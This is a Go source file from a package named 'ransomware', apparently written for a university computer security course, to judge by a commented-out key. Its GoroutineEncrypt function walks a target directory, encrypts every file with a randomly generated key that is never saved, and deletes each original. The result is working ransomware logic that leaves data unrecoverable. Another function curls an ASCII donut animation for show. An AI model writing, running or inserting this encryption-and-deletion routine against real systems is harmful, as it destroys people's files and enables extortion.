package goroutines

import (
	"fmt"
	"os"
	"path/filepath"
	"ransomware/encrypt"
	"ransomware/terminal"
	"time"
)

func GoroutineDonut(terminal *terminal.Terminal) {
	err := terminal.RunCommand("curl", "ascii.live/donut")
	if err != nil {
		fmt.Printf("Error displaying donut: %v\n", err)
	}
}

func GoroutineEncrypt(done chan bool, directory string) {
	fmt.Println("Encrypting target data...")
	key := encrypt.RandStringBytes(32)
	time.Sleep(2 * time.Second)
	/* key := []byte("---seguridad_informatica__UAO---") */

	err := filepath.Walk(directory, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if !info.IsDir() {
			outputPath := path + ".enc"
			fmt.Printf("Encrypting %s\n", path)
			if err := encrypt.EncryptFile(path, outputPath, []byte(key)); err != nil {
				return err
			}
			if err := os.Remove(path); err != nil {
				return err
			}
		}
		return nil
	})

	if err != nil {
		fmt.Println("Error encrypting or removing files:", err)
	} else {
		fmt.Println("All files have been encrypted and originals removed.")
	}
	done <- true
}
